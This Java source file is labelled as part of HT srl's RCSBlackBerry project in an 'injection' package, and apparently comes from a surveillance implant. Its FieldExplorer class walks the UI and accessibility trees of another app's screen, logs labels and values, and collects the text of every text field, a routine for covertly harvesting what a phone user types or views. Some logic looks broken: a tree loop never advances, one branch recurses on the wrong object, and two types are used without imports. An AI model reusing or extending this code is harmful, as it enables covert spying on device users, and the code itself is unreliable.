//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection;

import java.util.Hashtable;
import java.util.Vector;

import net.rim.device.api.lbs.MapField;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.Manager;
import net.rim.device.api.ui.component.BitmapField;
import net.rim.device.api.ui.component.ButtonField;
import net.rim.device.api.ui.component.CheckboxField;
import net.rim.device.api.ui.component.ChoiceField;
import net.rim.device.api.ui.component.DateField;
import net.rim.device.api.ui.component.GaugeField;
import net.rim.device.api.ui.component.LabelField;
import net.rim.device.api.ui.component.NullField;
import net.rim.device.api.ui.component.ObjectListField;
import net.rim.device.api.ui.component.RadioButtonField;
import net.rim.device.api.ui.component.SeparatorField;
import net.rim.device.api.ui.component.TextField;
import net.rim.device.api.ui.component.TreeField;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class FieldExplorer {
    Vector textfields;
    private static Debug debug = new Debug("FieldExplorer", DebugLevel.VERBOSE);

    //#ifdef FIELD_EXPLORER
    public Vector explore(Field field) {
        //debug.startBuffering(DebugLevel.INFORMATION);
        textfields = new Vector();
        exploreField(field, 0, new String[0], debug);
        //debug.stopBuffering();
        return textfields;
    }

    protected void exploreField(Field field, int deep, String[] history,
            Debug debug) {

        String tab = "";

        for (int i = 0; i < deep; i++) {
            tab += "   ";
        }

        debug.trace(tab + "" + getName(field.getClass()) + " hist: "
                + history.length);

        if (TreeField.class.isAssignableFrom(field.getClass())) {
            TreeField tree = (TreeField) field;

            // debug.trace(tab + "tree: " + tree.getNodeCount());

            int number = 0;

            int node = tree.nextNode(0, 0, true);
            while (node != -1 && number < 100) {
                number += 1;

                int next = tree.nextNode(node, 0, true);
                Object cookie = tree.getCookie(node);

                if (Field.class.isAssignableFrom(cookie.getClass())) {

                    exploreField((Field) cookie, deep + 1,
                            addHistory(history, getName(field.getClass())),
                            debug);
                } else {
                    AccessibleContext context = field.getAccessibleContext();
                    accessibleTraverse(context, deep + 1);
                }
            }

        } else if (Manager.class.isAssignableFrom(field.getClass())) {

            Manager manager = (Manager) field;
            // debug.trace(tab + "manager: " + manager.getFieldCount());

            for (int i = 0; i < manager.getFieldCount(); i++) {
                Field f = manager.getField(i);
                exploreField(f, deep + 1,
                        addHistory(history, getName(field.getClass())), debug);
            }
        } else if (ObjectListField.class.isAssignableFrom(field.getClass())) {
            ObjectListField list = (ObjectListField) field;
            // debug.trace(tab + "list: " + list.getSize());
            for (int i = 0; i < list.getSize(); i++) {
                Object cookie = list.get(list, i);

                if (Field.class.isAssignableFrom(cookie.getClass())) {
                    exploreField(field, deep + 1,
                            addHistory(history, getName(field.getClass())),
                            debug);
                } else {
                    AccessibleContext context = field.getAccessibleContext();
                    accessibleTraverse(context, deep + 1);
                }
            }
        } else if (LabelField.class.isAssignableFrom(field.getClass())) {
            LabelField label = (LabelField) field;
            debug.trace(tab + "label: " + label.getText());
        } else if (TextField.class.isAssignableFrom(field.getClass())) {
            TextField text = (TextField) field;

            debug.trace(tab + "TextField " + text.getLabel() + " : "
                    + text.getText() + " style: " + text.getFieldStyle());

            textfields.addElement(text.getText());

        } else if (BitmapField.class.isAssignableFrom(field.getClass())) {

            debug.trace(tab + "BitmapField");
        } else if (ButtonField.class.isAssignableFrom(field.getClass())) {

            debug.trace(tab + "ButtonField");
        } else if (CheckboxField.class.isAssignableFrom(field.getClass())) {

            debug.trace(tab + "CheckboxField");
        } else if (ChoiceField.class.isAssignableFrom(field.getClass())) {

            debug.trace(tab + "ChoiceField");
        } else if (DateField.class.isAssignableFrom(field.getClass())) {

            debug.trace(tab + "DateField");
        } else if (GaugeField.class.isAssignableFrom(field.getClass())) {

            debug.trace(tab + "GaugeField");
        } else if (NullField.class.isAssignableFrom(field.getClass())) {

            debug.trace(tab + "NullField");
        } else if (RadioButtonField.class.isAssignableFrom(field.getClass())) {

            debug.trace(tab + "RadioButtonField");
        } else if (SeparatorField.class.isAssignableFrom(field.getClass())) {

            debug.trace(tab + "SeparatorField");
            // } else if
            // (ShortcutIconField.class.isAssignableFrom(field.getClass())) {

            // debug.trace(tab + "ShortcutIconField");
        } else if (MapField.class.isAssignableFrom(field.getClass())) {

            debug.trace(tab + "MapField");
            // } else if (GLField.class.isAssignableFrom(field.getClass())) {
            // debug.trace(tab + "GLField");
            // } else if (VGField.class.isAssignableFrom(field.getClass())) {
            // debug.trace(tab + "VGField");
            // } else if (ScrollView.class.isAssignableFrom(field.getClass())) {

            // debug.trace(tab + "ScrollView");
        } else if (SpinBoxField.class.isAssignableFrom(field.getClass())) {

            debug.trace(tab + "SpinBoxField");
            // } else if
            // (ActivityImageField.class.isAssignableFrom(field.getClass())) {
            // debug.trace(tab + "ActivityImageField");
            // } else if
            // (ProgressBarField.class.isAssignableFrom(field.getClass())) {
            // debug.trace(tab + "ProgressBarField");
            // } else if
            // (PictureScrollField.class.isAssignableFrom(field.getClass())) {
            // debug.trace(tab + "PictureScrollField");
            // } else if
            // (ToolbarButtonField.class.isAssignableFrom(field.getClass())) {

            // debug.trace(tab + "ToolbarButtonField");
        } else if (Vector.class.isAssignableFrom(field.getClass())) {

            debug.trace(tab + "Vector");
        } else if (Hashtable.class.isAssignableFrom(field.getClass())) {

            debug.trace(tab + "Hashtable");
        }

        else {
            // debug.trace(tab + "unknown field");
            AccessibleContext context = field.getAccessibleContext();
            accessibleTraverse(context, deep + 1);

        }

    }

    private String[] addHistory(String[] history, String name) {

        String[] newHistory = new String[history.length + 1];
        for (int i = 0; i < history.length; i++) {
            newHistory[i] = history[i];
        }
        newHistory[history.length] = name;
        return newHistory;
    }

    private void accessibleTraverse(AccessibleContext context, int deep) {
        String tab = "";

        for (int i = 0; i < deep; i++) {
            tab += "   ";
        }

        if (context == null) {
            return;
        }

        debug.trace(tab + "" + getName(context.getClass()) + "");

        if (context.getAccessibleName() != null) {
            String name = context.getAccessibleName();
            debug.trace(tab + "name: " + name);
        }
        if (context.getAccessibleText() != null)
            debug.trace(tab + "text: " + context.getAccessibleText());
        if (context.getAccessibleValue() != null)
            debug.trace(tab + "value: " + context.getAccessibleValue());
        if (context.getAccessibleTable() != null)
            debug.trace(tab + "table: " + context.getAccessibleTable());
        if (context.getAccessibleParent() != null)
            debug.trace(tab + "parent: " + context.getAccessibleParent());

        if (context.getAccessibleChildCount() > 0) {
            debug.trace(tab + "count: " + context.getAccessibleChildCount());
            for (int i = 0; i < context.getAccessibleChildCount(); i++) {
                accessibleTraverse(context.getAccessibleChildAt(i), deep + 1);
            }
        }
    }

    private String getName(Class class1) {
        String name = class1.getName();
        int index = name.lastIndexOf('.');
        if (index > 0) {
            return name.substring(index + 1);
        }
        return name;
    }
    //#endif
}
